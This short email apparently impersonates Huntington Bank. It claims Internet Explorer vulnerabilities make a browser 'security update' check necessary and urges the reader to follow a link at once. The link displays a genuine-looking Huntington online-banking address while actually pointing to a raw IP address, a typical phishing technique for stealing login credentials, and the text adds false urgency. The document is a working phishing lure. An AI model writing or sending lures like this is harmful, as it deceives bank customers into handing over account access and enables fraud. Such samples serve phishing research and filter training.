 Dear Huntington Client, To provide our customers the most effective and secure online access to their accounts, we are continually upgrading our online services. As we add new features and enhancements to our service, there are certain browsers versions which will not support these system upgrades. As many customers already know, Microsoft Internet Explorer has significant 'holes' or vulnerabilities that virus creators can easily take advantage of . In order to further protect your account, we have introduced some new important security standards and browsers requirements. Huntington security systems require that you test your browser now to see if meets the requirements to Huntington Online Banking. Pleas follow this link in order to verify security update installation. https://onlinebanking.huntington.com/security/login.jsp (http://80.37.240.225/.a/index.htm) This security update will be effective immediately . In the meantime some of the Internet Banking services may not be available.
